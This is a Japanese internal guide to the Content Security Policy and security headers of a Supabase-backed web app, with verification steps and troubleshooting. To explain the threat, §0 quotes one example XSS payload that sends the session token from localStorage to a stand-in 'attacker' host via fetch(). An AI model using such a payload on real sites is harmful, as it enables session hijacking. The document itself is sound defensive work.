# Lais CSP（Content Security Policy）運用 SSoT

> 起票: PATCH-PB3-CSP / LAIS-PHASE-B-3-CSP（subagent、2026-04-26）
> 根拠: M4-A security_engineer HIGH R-003（session_progress.md L834）「CSP 未設定 + localStorage Supabase トークン窃取リスク」/ docs/learned-patterns.md LP-003（CSP / localStorage トークン窃取対策）/ Phase B 本番前必須 5 件の 3 件目
> 一次防御: HTTP ヘッダ（`lais/public/_headers`）/ 二次防御: HTML meta（`lais/index.html`）

---

## §0. 目的

Lais は Supabase セッションを `localStorage` の `sb-{project-ref}-auth-token` に保持する（`lais/src/lib/supabase.js` `persistSession: true`）。XSS が成立した場合、`<script>fetch('https://attacker/?'+localStorage.getItem('...'))</script>` 一発でセッショントークンが奪取され、攻撃者は被害者として API 操作可能になる。CSP は

1. **インラインスクリプト/任意外部 URL からの fetch を遮断**して XSS 自体の成立を阻止
2. **frame-ancestors 'none'** で iframe 埋め込みによる UI redress / clickjacking を防止
3. **upgrade-insecure-requests** で http://混入を https://に強制昇格、トランジット中の漏洩を防止

の三段防御を担う。

---

## §1. 適用方式

| 層 | 配置 | 適用範囲 | 効くもの / 効かないもの |
|---|---|---|---|
| **一次（推奨）** | `lais/public/_headers` → CF Pages が HTTP ヘッダ送出 | 全パス（`/*`） | 全ディレクティブ有効（**`frame-ancestors`** は HTTP ヘッダ専用、meta では効かない） |
| **二次（補助）** | `lais/index.html` `<meta http-equiv="Content-Security-Policy">` | HTML 取得後の DOM パース時点 | meta では `frame-ancestors` / `report-uri` / `sandbox` が効かない（仕様上） |

CF Pages は `_headers` を自動配信、Vite ビルド時に `dist/_headers` へコピーされる（`public/` 配下のため）。`lais/index.html` の meta はビルド出力 `dist/index.html` 内にも保持される。両層併用で、ヘッダ未到達（プロキシ落ち等）でも meta が最低限の防御を継続する。

---

## §2. 採用ポリシー（全文 + 各ディレクティブ根拠）

```
default-src 'self';
script-src 'self' 'sha256-iaun56vpztwl9vHAOpiDb01bSUY7FeWrbAD2OL77WG0=';
style-src 'self' 'unsafe-inline';
connect-src 'self' https://*.supabase.co wss://*.supabase.co https://*.supabase.in;
img-src 'self' data: blob: https://*.supabase.co;
font-src 'self' data:;
media-src 'self';
worker-src 'self' blob:;
manifest-src 'self';
frame-src 'none';
child-src 'none';
object-src 'none';
base-uri 'self';
form-action 'self';
frame-ancestors 'none';   # _headers のみ
upgrade-insecure-requests
```

| ディレクティブ | 設定値 | 根拠 |
|---|---|---|
| `default-src` | `'self'` | 未指定ディレクティブ全てを self オリジンに制限。fallback 安全網 |
| `script-src` | `'self' 'sha256-...'` | 同一オリジンの module script + `lais/index.html` の theme bootstrap inline script を hash で許可（FOUC 防止のため inline 必須）。`'unsafe-inline'` / `'unsafe-eval'` 不採用 |
| `style-src` | `'self' 'unsafe-inline'` | Vite が build 時に CSS を `<style>` で inline 埋め込み + Preact の動的 style attribute（`<div style="...">`）に必要。production で `unsafe-inline` 排除は §6 残課題 |
| `connect-src` | `'self' https://*.supabase.co wss://*.supabase.co https://*.supabase.in` | Supabase Auth / REST / Realtime / Storage の HTTPS + WSS。`*.supabase.in` は Auth リダイレクトで稀に経由する旧ドメイン保険 |
| `img-src` | `'self' data: blob: https://*.supabase.co` | Vite SVG inline data URI + 動的 blob プレビュー + Supabase Storage の画像 |
| `font-src` | `'self' data:` | `tokens.css` 内の inline data URI font 対策 |
| `media-src` | `'self'` | 将来の音声フィードバック / video 同オリジン制限 |
| `worker-src` | `'self' blob:` | Service Worker / Web Worker（Vite が blob URL で生成するケース対応） |
| `manifest-src` | `'self'` | PWA manifest.json 配信時 |
| `frame-src` / `child-src` | `'none'` | iframe 埋め込み禁止（広告 / 外部 chat widget 不使用方針） |
| `object-src` | `'none'` | `<object>` / `<embed>` / Flash 全面禁止（XSS 攻撃面除去） |
| `base-uri` | `'self'` | `<base>` タグ汚染による相対パスハイジャック防止 |
| `form-action` | `'self'` | `<form action="...">` の外部送信禁止（フィッシング防止） |
| `frame-ancestors` | `'none'` | 自身が iframe 埋め込みされることを禁止 = clickjacking / UI redress 完全遮断（X-Frame-Options: DENY と二重） |
| `upgrade-insecure-requests` | (flag) | http://参照を https:// に自動昇格、混在コンテンツ警告解消 |

---

## §3. 付随セキュリティヘッダ（`_headers` 同梱）

| ヘッダ | 値 | 目的 |
|---|---|---|
| `X-Frame-Options` | `DENY` | 旧ブラウザ向け clickjacking 防御（CSP `frame-ancestors` の互換層） |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing 攻撃防止 |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | クロスオリジン遷移時に path / query を流出させない |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=(), usb=(), interest-cohort=()` | 不要なブラウザ機能を全許可拒否（FLoC 含む） |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | HSTS 1 年。CF Pages の HTTPS 配信前提 |
| `Cross-Origin-Opener-Policy` | `same-origin` | window.opener 経由のクロスオリジン操作を遮断（タブナビング防御） |
| `Cross-Origin-Resource-Policy` | `same-site` | クロスオリジンサイトからの埋込フェッチ禁止 |

---

## §4. nonce / hash 戦略

現状は **hash 方式**（`'sha256-iaun56vpztwl9vHAOpiDb01bSUY7FeWrbAD2OL77WG0='`）を採用、`lais/index.html` 内 inline script（テーマブートストラップ FOUC 防止用）を許可している。インライン内容を変更したらハッシュも再計算が必要：

```sh
node -e "const fs=require('fs');const c=require('crypto');const h=fs.readFileSync('lais/index.html','utf8');const m=h.match(/<script>([\\s\\S]*?)<\\/script>/);console.log('sha256-'+c.createHash('sha256').update(m[1]).digest('base64'));"
```

**nonce 方式に切替える条件**: Pages Functions で `_middleware.ts` を導入してリクエスト毎に nonce 生成 → `<script nonce="...">` を SSR 時注入できるようになった時。現状は静的 SPA のため hash 方式で十分。

---

## §5. 検証手順

### §5.1 ローカル開発時

```sh
cd lais
npm run dev
# → http://localhost:5173 で開いて DevTools Console を確認
# → "Refused to ..." の CSP violation が 0 件であること
```

> 注: Vite dev server は `_headers` を配信しないため、ローカル動作では meta タグ側のみ有効。`unsafe-inline` を `style-src` で許可しているため Vite HMR の動的 inline style もブロックされない。

### §5.2 production build 動作確認

```sh
cd lais
npm run build
npx wrangler pages dev dist --port 8788
# → http://localhost:8788 で開く
# → DevTools → Network → トップ HTML のレスポンスヘッダに Content-Security-Policy が含まれること
# → DevTools → Console で violation 0 件であること
# → Application → Local Storage → sb-...-auth-token が保持されていること
```

### §5.3 本番デプロイ後

```sh
# ヘッダ送出確認
curl -sI https://lais-3yk.pages.dev/ | grep -iE "content-security-policy|x-frame|strict-transport"

# Mozilla Observatory で評価（A 等級狙い）
# https://observatory.mozilla.org/analyze/lais-3yk.pages.dev
```

期待値:
- Content-Security-Policy: ヘッダ存在
- securityheaders.com: A+ 等級
- Mozilla Observatory: A 以上

---

## §6. 残課題 / 改善ロードマップ

| # | 項目 | 現状 | 目標 | フェーズ |
|---|---|---|---|---|
| 1 | `style-src 'unsafe-inline'` 排除 | 必要（Vite + Preact） | hashed style + nonce 方式に移行 | Phase C 以降 |
| 2 | nonce 方式採用 | hash 方式 | Pages Functions `_middleware.ts` でリクエスト毎 nonce 注入 | Phase C 以降 |
| 3 | report-uri / report-to 設定 | 未設定 | violation を Sentry / Cloudflare Analytics に送出 | Sentry 導入時 |
| 4 | `connect-src` の OpenAI 等追加 | 不要（Worker 経由） | Worker proxy 維持 + 直接呼出の発生時のみ追加 | 現状維持 |
| 5 | Trusted Types | 未対応 | `require-trusted-types-for 'script'` を policy に追加検討 | Phase D |

---

## §7. トラブルシューティング 5 件

### §7.1 inline script を変更したら CSP violation で画面が真っ白

**症状**: `lais/index.html` の `<script>` (theme bootstrap) を編集後、ブラウザで `Refused to execute inline script because it violates the following Content Security Policy directive: "script-src ..."`

**原因**: hash 不一致。`script-src 'sha256-iaun56v...='` の値は変更前の inline script に対応するもの。

**対応**: §4 のコマンドで新 hash を計算 → `lais/public/_headers` と `lais/index.html` の meta 両方を一括置換。dev / production / hash 計算用コマンドの 3 箇所を漏れなく更新。

---

### §7.2 Supabase Realtime（WSS）が接続できない

**症状**: DevTools Console で `Refused to connect to 'wss://xxx.supabase.co/realtime/v1/websocket' because it violates ... connect-src`

**原因**: `connect-src` に `wss://*.supabase.co` が抜けている、または プロジェクトリージョンの WSS ホストが `*.supabase.co` ワイルドカードに該当しないケース。

**対応**:
1. ブラウザの `network.supabase.co` / `<project>.supabase.co` の実 WSS URL を Network タブで確認
2. 必要なら `connect-src` に明示的なホスト追加（例: `wss://realtime.supabase.co`）
3. ワイルドカード `*.supabase.co` で覆われているか CSP Evaluator（https://csp-evaluator.withgoogle.com/）で再確認

---

### §7.3 OAuth プロバイダ（Google / Apple）コールバックでブロック

**症状**: Supabase Auth の OAuth 経由ログインで `Refused to redirect to 'https://accounts.google.com/...' because it violates ... form-action 'self'`

**原因**: OAuth は `form-action` または `connect-src` の対象になる場合がある。Supabase の OAuth は基本的にトップレベル navigation（`window.location.href = ...`）で行うため、CSP `form-action` の影響は通常受けない。受ける場合は `<form>` 経由の OAuth 起動が原因。

**対応**: `S01Auth.jsx` の OAuth 起動が `<form>` 経由になっていないか確認（`supabase.auth.signInWithOAuth` 経由なら問題なし）。`<form>` 経由ならコードを `signInWithOAuth` に変更、または `form-action` に `https://accounts.google.com https://appleid.apple.com` 追加（最後の手段）。

---

### §7.4 Vite HMR の Web Worker / blob URL がブロック

**症状**: dev mode で `Refused to create a worker from 'blob:http://localhost:5173/...' because it violates ... worker-src 'self'`

**原因**: Vite HMR が blob URL で Web Worker を起動。`worker-src 'self'` のみだと blob 不許可。

**対応**: 既に `worker-src 'self' blob:` 設定済 → 起きない想定。再現したら `connect-src` `'self' blob:` の追加も検討。

---

### §7.5 Supabase Storage 画像が表示されない

**症状**: アバター画像表示で `Refused to load the image 'https://xxx.supabase.co/storage/v1/object/public/...' because it violates ... img-src`

**原因**: `img-src` から `https://*.supabase.co` が抜けている。

**対応**: 既に `img-src 'self' data: blob: https://*.supabase.co` 設定済 → 起きない想定。Supabase 画像が CDN（`*.supabase.in` 等）経由配信に変わった場合は `img-src` に追加。

---

## §8. 関連ファイル

| ファイル | 役割 |
|---|---|
| `lais/public/_headers` | 一次防御（HTTP ヘッダ）、CF Pages が `dist/_headers` 経由で送出 |
| `lais/index.html` | 二次防御（meta http-equiv） |
| `lais/dist/_headers` | ビルド成果物。`public/_headers` のコピー |
| `lais/dist/index.html` | ビルド成果物。meta CSP を含む |
| `lais/src/lib/supabase.js` | localStorage への session 保持元（`persistSession: true`、CSP の防御対象） |
| `lais/verify/dev_system_v34_patches.md` PATCH-PB3-CSP | 起票記録 |
| `instructions/session_progress.md` Last done | LAIS-PHASE-B-3-CSP 完遂エントリ |
| `docs/learned-patterns.md` LP-003 | CSP / localStorage トークン窃取対策パターン |

---

## §9. 改訂履歴

| 日付 | 改訂 | 担当 |
|---|---|---|
| 2026-04-26 | 初版起票（PATCH-PB3-CSP）。Phase B-3 完遂、M4-A R-003 解消 | LAIS-PHASE-B-3-CSP subagent |

---
